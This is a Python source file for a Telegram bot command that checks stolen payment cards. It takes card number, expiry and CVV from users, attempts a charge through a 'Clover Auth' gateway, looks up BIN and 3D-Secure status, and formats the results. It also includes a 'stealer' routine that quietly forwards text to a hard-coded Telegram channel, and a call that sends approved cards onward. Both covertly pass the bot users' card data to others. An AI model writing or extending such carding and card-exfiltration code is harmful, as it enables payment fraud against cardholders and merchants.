import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *
from BOT.tools.hit_stealer import send_hit_if_approved
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# Replace with your actual channel ID
STEALER_CHANNEL_ID = -1002549777556

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("cl", [".", "/"]))
async def stripe_auth_cmd(client: Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(client, message)

        gateway = "Clover Auth"

        if checkall[0] is False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /cl

Message: No CC Found in your input ❌

Usage: /cl cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        await firstchk.edit_text(secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        sks = await getallsk()
        result = await create_cvv_charge(fullcc, session)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)

        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        await firstchk.edit_text(thirdresp)

        brand, type, level, bank, country, flag, currency = getbin
        bin_code = cc[:6]

        # Check vbvbin.txt file for VBV status
        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()

            for line in vbv_data:
                if line.startswith(cc[:6]):
                    parts = line.strip().split('|')
                    if len(parts) > 1:
                        vbv_response = parts[1]
                        if "3D TRUE ❌" in vbv_response:
                            vbv_status = "3D TRUE ❌"
                        elif "3D PASSED ✅" in vbv_response:
                            vbv_status = "3D PASSED ✅"
                    break
            else:
                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except Exception:
            vbv_status = "VBV File Error"

        proxy_status = "Live ✨"

        finalresp = f"""
{status}
━━━━━━━━━━━━━━━
[㊕](t.me/spid_3r) Card ➺ <code>{fullcc}</code>
[㊕](t.me/spid_3r) Gateway ➺ <i>{gateway}</i>
[㊕](t.me/spid_3r) Response ➺ ⤿ {response} ⤾
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[㊕](t.me/spid_3r) Bin ➺ {bin_code}
[㊕](t.me/spid_3r) Info ➺ {brand} - {type} - {level}
[㊕](t.me/spid_3r) Bank ➺ {bank}
[㊕](t.me/spid_3r) Country ➺ {country} - {flag} - {currency}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[仝] VBV ➺ {vbv_status}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[㊕](t.me/spid_3r) Checked By ➺ <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[㊕](t.me/spid_3r) Dev ➺ ⏤‌‌‌‌ <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
━━━━━━━━━━━━━━━
[㊕](t.me/spid_3r) T/t ➺ [{time.perf_counter() - start:0.2f} seconds] | P/x ➺ [{proxy_status}]
"""

        buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("Group", url="https://t.me/+W1ZVCjwjbvs5MTll"),
                    InlineKeyboardButton("Owner", url="https://t.me/spid_3r")
                ]
            ]
        )

        await asyncio.sleep(0.5)
        await firstchk.edit_text(finalresp, reply_markup=buttons)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
        
